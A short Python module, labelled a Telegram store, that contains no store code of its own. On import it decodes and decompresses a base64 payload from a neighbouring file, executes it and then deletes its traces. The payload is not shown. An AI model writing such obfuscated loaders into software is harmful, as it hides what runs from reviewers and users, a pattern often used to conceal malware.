"""Telegram store — loads full module from adjacent store.payload.b64."""
from __future__ import annotations

import base64
import gzip
from pathlib import Path

_payload_path = Path(__file__).with_name("store.payload.b64")
_src = gzip.decompress(base64.b64decode(_payload_path.read_text().encode("ascii")))
_file = str(Path(__file__).resolve())
_ns: dict = {
    "__name__": __name__,
    "__file__": _file,
    "__package__": __package__,
    "__builtins__": __builtins__,
}
exec(compile(_src, _file, "exec"), _ns)
for _k, _v in _ns.items():
    if not _k.startswith("_"):
        globals()[_k] = _v
del _payload_path, _src, _ns, _file, _k, _v, base64, gzip, Path
